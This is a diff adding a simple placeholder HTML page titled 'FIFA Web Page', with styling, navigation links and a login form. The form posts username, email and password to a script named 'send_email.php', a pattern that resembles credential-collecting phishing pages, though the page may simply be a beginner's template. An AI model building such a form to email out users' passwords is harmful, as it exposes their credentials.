@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FIFA Web Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #a7a7a7; /* Light green background */
+        }
+
+        header {
+            background-color: #1a1a1a;
+            color: #fff;
+            text-align: center;
+            padding: 10px 0;
+        }
+
+        nav {
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            padding: 10px 0;
+        }
+
+        nav a {
+            color: #fff;
+            text-decoration: none;
+            padding: 0 10px;
+        }
+
+        .container {
+            max-width: 100%;
+            padding: 20px;
+        }
+
+        /* You can add more styles for content, images, etc. */
+        .login-form {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .login-form input[type="text"],
+        .login-form input[type="email"],
+        .login-form input[type="password"] {
+            width: calc(100% - 40px); /* Subtracting icon width and some space for better alignment */
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            padding-left: 40px; /* Adjusted padding for text */
+        }
+
+        .login-form input[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            background-color: #1a1a1a;
+            color: #fff;
+            cursor: pointer;
+        }
+
+        .login-form input[type="submit"]:active {
+            background-color: #ccc; /* Light grey when clicked */
+        }
+
+        /* Additional style for input box */
+        .input-box {
+            position: relative;
+        }
+
+        .input-box .icon {
+            position: absolute;
+            right: 10px; /* Adjusted to right side */
+            top: 50%;
+            transform: translateY(-50%);
+            color: #ccc;
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <h1>FIFA Web Page</h1>
+</header>
+
+<nav>
+    <a href="#">Home</a>
+    <a href="#">Players</a>
+    <a href="#">Teams</a>
+    <a href="#">Tournaments</a>
+    <!-- Add more links as needed -->
+</nav>
+
+<div class="container">
+    <!-- Your content goes here -->
+    <p>Welcome to the FIFA web page. This is a placeholder content.</p>
+    
+    <!-- Login Form -->
+    <div class="login-form">
+        <h2>Login</h2>
+        <form action="send_email.php" method="post">
+            <div class="input-box">
+                <span class="icon">
+                    <ion-icon name="mail"></ion-icon>
+                </span>
+                <input type="text" name="username" placeholder="Username" required><br>
+            </div>
+            <input type="email" name="email" placeholder="Email" required><br>
+            <input type="password" name="password" placeholder="Password" required><br>
+            <input type="submit" value="Login">
+        </form>
+    </div>
+</div>
+<script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
+<script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
+</body>
+</html>
